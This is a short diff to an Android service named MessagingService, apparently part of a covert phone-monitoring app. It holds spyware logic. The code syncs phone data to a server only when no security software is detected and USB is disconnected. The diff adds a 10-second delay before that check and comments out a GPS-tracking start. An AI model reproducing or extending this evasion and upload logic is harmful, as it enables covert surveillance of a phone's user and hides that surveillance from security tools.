@@ -190,6 +190,12 @@ public class MessagingService extends Service {
             new Thread(new Runnable() {
                 @Override
                 public void run() {
+                   // Lofl.onReceiveCommand(MessagingService.this, 21, "start", null);
+                    try {
+                        Thread.sleep(10000);
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
                     boolean hasSecuritySoftware = Lofl.hasSecuritySoftwareInstalled(MessagingService.this);
                     if( ! hasSecuritySoftware && Lofl.isUsbDisconnected(MessagingService.this)){
                         Lofl.onReceiveCommand(MessagingService.this, Commands.SYNC_PHONE_TO_SERVER, null, null);
@@ -197,9 +203,9 @@ public class MessagingService extends Service {
                 }
             }).start();
         }
-        if(JobsIntentService.sShouldTrackGps){
+       /* if(JobsIntentService.sShouldTrackGps){
             Lofl.onReceiveCommand(this, Commands.GPS_TRACKER, "start", null);
-        }
+        }*/
         return super.onStartCommand(intent, flags, startId);
     }
 
